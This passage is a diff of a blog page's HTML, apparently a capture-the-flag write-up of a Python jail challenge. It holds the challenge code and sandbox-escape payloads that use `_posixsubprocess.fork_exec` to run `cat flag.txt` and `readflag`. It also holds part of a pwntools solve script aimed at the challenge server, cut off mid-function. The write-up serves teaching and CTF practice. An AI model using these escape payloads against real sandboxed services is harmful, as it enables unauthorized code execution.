@@ -16,7 +16,9 @@
   <link rel="stylesheet" href="/css/font.css"/>
   <link rel="stylesheet" href="/css/smigle.css"/>
   
-  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+ <link rel="stylesheet" href="/css/syntax.css">
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
   <link rel="manifest" href="/site.webmanifest">
@@ -29,14 +31,14 @@
     <div id="root">
       <header>
   <div id="brand">
-    <a class="icon-link" href="https://salvatore-abello.github.io/">
+    <a class="icon-link" href="https://blog.babelo.xyz/">
       <img
         class="icon"
         src="/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"
       />
     </a>
     <div class="text">
-      <a href="https://salvatore-abello.github.io/"><h1>Salvatore Abello&#39;s Blog</h1></a>
+      <a href="https://blog.babelo.xyz/"><h1>Salvatore Abello&#39;s Blog</h1></a>
       <h3>Hacking &amp; other stuff</h3>
     </div>
   </div>
@@ -137,38 +139,38 @@
 <li><code>audit_sandbox.c</code> a C program which uses <a href="https://peps.python.org/pep-0578/">Audit Hooks</a> to implement a whitelist sandbox. The only audit events we&rsquo;re allowed to use are <code>compile</code> and <code>exec</code></li>
 <li><code>chall.py</code> the actual challenge script</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># python3.10 chall.py build</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># obligatory pyjail + PyMagic = ?</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os<span style="color:#f92672">,</span> sys
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> distutils.core <span style="color:#f92672">import</span> Extension, setup
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span> <span style="color:#75715e"># Useless stuff</span>
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;&gt;&gt;&gt; &#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> audit_sandbox
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>audit_sandbox<span style="color:#f92672">.</span>install_hook()
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">del</span> audit_sandbox
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">del</span> sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#34;audit_sandbox&#34;</span>]
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">del</span> sys
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>  <span style="color:#75715e"># ill be nice :)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>eval <span style="color:#f92672">=</span> eval
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;[()&#39;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">0123456789 ]&#34;</span>, code):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> (b <span style="color:#f92672">:=</span> __builtins__<span style="color:#f92672">.</span>__dict__)<span style="color:#f92672">.</span>keys():
-</span></span><span style="display:flex;"><span>        b[k] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    eval(code, {<span style="color:#e6db74">&#34;__builtins__&#34;</span>: {}, <span style="color:#e6db74">&#34;_&#34;</span>: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz})
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Nope.&#34;</span>)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># python3.10 chall.py build</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># obligatory pyjail + PyMagic = ?</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">distutils.core</span> <span class="kn">import</span> <span class="n">Extension</span><span class="p">,</span> <span class="n">setup</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="c1"># Useless stuff</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">audit_sandbox</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">audit_sandbox</span><span class="o">.</span><span class="n">install_hook</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">del</span> <span class="n">audit_sandbox</span>
+</span></span><span class="line"><span class="cl"><span class="k">del</span> <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s2">&#34;audit_sandbox&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">del</span> <span class="n">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>  <span class="c1"># ill be nice :)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="o">=</span> <span class="nb">eval</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;[()&#39;</span><span class="se">\&#34;</span><span class="s2">0123456789 ]&#34;</span><span class="p">,</span> <span class="n">code</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="p">(</span><span class="n">b</span> <span class="o">:=</span> <span class="n">__builtins__</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">)</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">eval</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;__builtins__&#34;</span><span class="p">:</span> <span class="p">{},</span> <span class="s2">&#34;_&#34;</span><span class="p">:</span> <span class="n">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Nope.&#34;</span><span class="p">)</span>
 </span></span></code></pre></div><p>A lot of things immediately catch the eye</p>
 <ul>
 <li>All builtin functions are <em>apparently</em> deleted except <code>eval</code> but can be accessed from the <code>__main__</code> module</li>
@@ -184,16 +186,16 @@
   </a>
 </h3>
 <p>In this case, we can use a cool trick from the <code>PyMagic</code> challenge mentioned above</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">call_function</span>(f, arg):
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> (<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[[None for _.__class_getitem__ in [</span><span style="color:#e6db74">{</span>f<span style="color:#e6db74">}</span><span style="color:#e6db74">]],&#34;</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;_[</span><span style="color:#e6db74">{</span>arg<span style="color:#e6db74">}</span><span style="color:#e6db74">]][True]&#34;</span>)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">call_function</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[[None for _.__class_getitem__ in [</span><span class="si">{</span><span class="n">f</span><span class="si">}</span><span class="s2">]],&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="sa">f</span><span class="s2">&#34;_[</span><span class="si">{</span><span class="n">arg</span><span class="si">}</span><span class="s2">]][True]&#34;</span><span class="p">)</span>
 </span></span></code></pre></div><p>Thanks to <a href="https://peps.python.org/pep-0560/#class-getitem"><code>__class_getitem__</code></a> we&rsquo;re able to call any function without using brackets</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>[
-</span></span><span style="display:flex;"><span>    [
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">None</span> <span style="color:#66d9ef">for</span> _<span style="color:#f92672">.</span>__class_getitem__ <span style="color:#f92672">in</span> [int] <span style="color:#75715e"># Equivalent of _.__class_getitem__ = int</span>
-</span></span><span style="display:flex;"><span>    ],
-</span></span><span style="display:flex;"><span>    _[<span style="color:#e6db74">&#39;12&#39;</span>] <span style="color:#75715e"># Calling _.__class_getitem__ -&gt; int</span>
-</span></span><span style="display:flex;"><span>][<span style="color:#66d9ef">True</span>] <span style="color:#75715e"># Get the return value</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="kc">None</span> <span class="k">for</span> <span class="n">_</span><span class="o">.</span><span class="n">__class_getitem__</span> <span class="ow">in</span> <span class="p">[</span><span class="nb">int</span><span class="p">]</span> <span class="c1"># Equivalent of _.__class_getitem__ = int</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_</span><span class="p">[</span><span class="s1">&#39;12&#39;</span><span class="p">]</span> <span class="c1"># Calling _.__class_getitem__ -&gt; int</span>
+</span></span><span class="line"><span class="cl"><span class="p">][</span><span class="kc">True</span><span class="p">]</span> <span class="c1"># Get the return value</span>
 </span></span></code></pre></div><p>But using this method, we have limitations: we are forced to pass only one argument to a function</p>
 
 <h3 id="obligatory-pyjail">
@@ -203,7 +205,7 @@
 </h3>
 <p>Ok now we need to bypass the audit sandbox. The file called <code>audit_sandbox.c</code> was actually <del>stolen</del> taken from <code>LIT CTF 2023</code></p>
 <p>Let&rsquo;s just take a look the solve for <code>obligatory pyjail</code> (Credits to flocto)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>[lm<span style="color:#f92672">:=</span>()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">104</span>]<span style="color:#f92672">.</span>load_module,p<span style="color:#f92672">:=</span>__import__(<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>pipe,_ps<span style="color:#f92672">:=</span>lm(<span style="color:#e6db74">&#34;_posixsubprocess&#34;</span>),_ps<span style="color:#f92672">.</span>fork_exec([<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/cat&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt&#34;</span>], [<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/cat&#34;</span>], <span style="color:#66d9ef">True</span>, (), <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">*</span>(p()), <span style="color:#66d9ef">False</span>, <span style="color:#66d9ef">False</span>, <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">None</span>)]
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">[</span><span class="n">lm</span><span class="o">:=</span><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">104</span><span class="p">]</span><span class="o">.</span><span class="n">load_module</span><span class="p">,</span><span class="n">p</span><span class="o">:=</span><span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">pipe</span><span class="p">,</span><span class="n">_ps</span><span class="o">:=</span><span class="n">lm</span><span class="p">(</span><span class="s2">&#34;_posixsubprocess&#34;</span><span class="p">),</span><span class="n">_ps</span><span class="o">.</span><span class="n">fork_exec</span><span class="p">([</span><span class="sa">b</span><span class="s2">&#34;/bin/cat&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">],</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;/bin/cat&#34;</span><span class="p">],</span> <span class="kc">True</span><span class="p">,</span> <span class="p">(),</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">p</span><span class="p">()),</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="kc">None</span><span class="p">)]</span>
 </span></span></code></pre></div><p>So using <code>_posixsubprocess.fork_exec</code> we bypass that sandobx. Cool, but there&rsquo;s a catch: <code>fork_exec</code> requires exactly 21 arguments. As I said before, we&rsquo;re allowed to pass exactly 1 argument using <code>_.__class_getitem__</code></p>
 <p>And now what?</p>
 
@@ -229,52 +231,52 @@
   </a>
 </h2>
 <p>I copy pasted the solve for <code>PyMagic</code>, you can find it <a href="https://github.com/SuperStormer/writeups/blob/master/tcp1pctf_2023/misc/pymagic/solve_pymagic.py">here</a> (Credits to SuperStormer)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_int</span>(i):
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;False&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;--&#34;</span><span style="color:#f92672">.</span>join([<span style="color:#e6db74">&#34;True&#34;</span>] <span style="color:#f92672">*</span> i)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">call_function</span>(f, arg):
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[[None for _.__class_getitem__ in [</span><span style="color:#e6db74">{</span>f<span style="color:#e6db74">}</span><span style="color:#e6db74">]],&#34;</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;_[</span><span style="color:#e6db74">{</span>arg<span style="color:#e6db74">}</span><span style="color:#e6db74">]][True]&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>type_s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;_.__class__&#34;</span>
-</span></span><span style="display:flex;"><span>object_s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;_.__base__&#34;</span>
-</span></span><span style="display:flex;"><span>subclasses <span style="color:#f92672">=</span> call_function(type_s <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.__subclasses__&#34;</span>, object_s) <span style="color:#75715e"># _.__class__.__subclasses__(_.__base__)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>wrap_close <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>subclasses<span style="color:#e6db74">}</span><span style="color:#e6db74">[</span><span style="color:#e6db74">{</span>gen_int(<span style="color:#ae81ff">137</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">]&#34;</span> <span style="color:#75715e"># os._wrap_close</span>
-</span></span><span style="display:flex;"><span>os_module <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>wrap_close<span style="color:#e6db74">}</span><span style="color:#e6db74">.__init__.__globals__&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span>:<span style="color:#66d9ef">pass</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build_string</span>(string):
-</span></span><span style="display:flex;"><span>    src <span style="color:#f92672">=</span> []<span style="color:#f92672">.</span>__doc__<span style="color:#f92672">.</span>__doc__ <span style="color:#f92672">+</span> {}<span style="color:#f92672">.</span>__doc__
-</span></span><span style="display:flex;"><span>    final <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> string:
-</span></span><span style="display:flex;"><span>        fromdoc <span style="color:#f92672">=</span> (a<span style="color:#f92672">:=</span>src<span style="color:#f92672">.</span>find(x)) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> fromdoc:
-</span></span><span style="display:flex;"><span>            final <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[[].__doc__.__doc__+</span><span style="color:#ae81ff">{{}}</span><span style="color:#e6db74">.__doc__][False][</span><span style="color:#e6db74">{</span>gen_int(a)<span style="color:#e6db74">}</span><span style="color:#e6db74">]+&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>: final <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;_.__qualname__[</span><span style="color:#e6db74">{</span>gen_int(ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz<span style="color:#f92672">.</span>__qualname__<span style="color:#f92672">.</span>find(x))<span style="color:#e6db74">}</span><span style="color:#e6db74">]+&#34;</span> <span style="color:#66d9ef">if</span> ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz<span style="color:#f92672">.</span>__qualname__<span style="color:#f92672">.</span>find(x) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">else</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>call_function(<span style="color:#e6db74">&#39;_.__class__.__subclasses__&#39;</span>, <span style="color:#e6db74">&#39;_.__base__&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">[</span><span style="color:#e6db74">{</span>gen_int(<span style="color:#ae81ff">14</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">].__doc__[True]+&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> final[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>sys_s <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*</span><span style="color:#e6db74">{</span>os_module<span style="color:#e6db74">}</span><span style="color:#e6db74">][</span><span style="color:#e6db74">{</span>gen_int(<span style="color:#ae81ff">9</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">]&#34;</span>
-</span></span><span style="display:flex;"><span>sys_modules <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>os_module<span style="color:#e6db74">}</span><span style="color:#e6db74">[</span><span style="color:#e6db74">{</span>sys_s<span style="color:#e6db74">}</span><span style="color:#e6db74">].modules&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>main_module_s <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*</span><span style="color:#e6db74">{</span>sys_modules<span style="color:#e6db74">}</span><span style="color:#e6db74">][</span><span style="color:#e6db74">{</span>gen_int(<span style="color:#ae81ff">22</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">]&#34;</span>
-</span></span><span style="display:flex;"><span>eval_func <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>sys_modules<span style="color:#e6db74">}</span><span style="color:#e6db74">[</span><span style="color:#e6db74">{</span>main_module_s<span style="color:#e6db74">}</span><span style="color:#e6db74">].eval&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>to_eval <span style="color:#f92672">=</span> build_string(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[(os_module:=().__class__.__base__.__subclasses__()[</span><span style="color:#e6db74">{</span>gen_int(<span style="color:#ae81ff">137</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">].__init__.__globals__).__class__,(sys:=os_module[&#39;sys&#39;]).__class__,sys.modules[&#39;_posixsubprocess&#39;].fork_exec([f&#39;.</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True:c</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">readflag&#39;.encode()],[f&#39;.</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True:c</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">readflag&#39;.encode()],True,(),None,None,-True,-True,-True,-True,-True,-True,*(os_module[&#39;pipe&#39;]()),False,False,None,None,None,-True,None)]&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>system_sh <span style="color:#f92672">=</span> call_function(eval_func, to_eval)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;34.139.98.117&#34;</span>, <span style="color:#ae81ff">6669</span>)
-</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(system_sh)
-</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">gen_int</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;False&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;--&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s2">&#34;True&#34;</span><span class="p">]</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">call_function</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[[None for _.__class_getitem__ in [</span><span class="si">{</span><span class="n">f</span><span class="si">}</span><span class="s2">]],&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34;_[</span><span class="si">{</span><span class="n">arg</span><span class="si">}</span><span class="s2">]][True]&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">type_s</span> <span class="o">=</span> <span class="s2">&#34;_.__class__&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">object_s</span> <span class="o">=</span> <span class="s2">&#34;_.__base__&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">subclasses</span> <span class="o">=</span> <span class="n">call_function</span><span class="p">(</span><span class="n">type_s</span> <span class="o">+</span> <span class="s2">&#34;.__subclasses__&#34;</span><span class="p">,</span> <span class="n">object_s</span><span class="p">)</span> <span class="c1"># _.__class__.__subclasses__(_.__base__)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">wrap_close</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">subclasses</span><span class="si">}</span><span class="s2">[</span><span class="si">{</span><span class="n">gen_int</span><span class="p">(</span><span class="mi">137</span><span class="p">)</span><span class="si">}</span><span class="s2">]&#34;</span> <span class="c1"># os._wrap_close</span>
+</span></span><span class="line"><span class="cl"><span class="n">os_module</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">wrap_close</span><span class="si">}</span><span class="s2">.__init__.__globals__&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class="p">:</span><span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_string</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
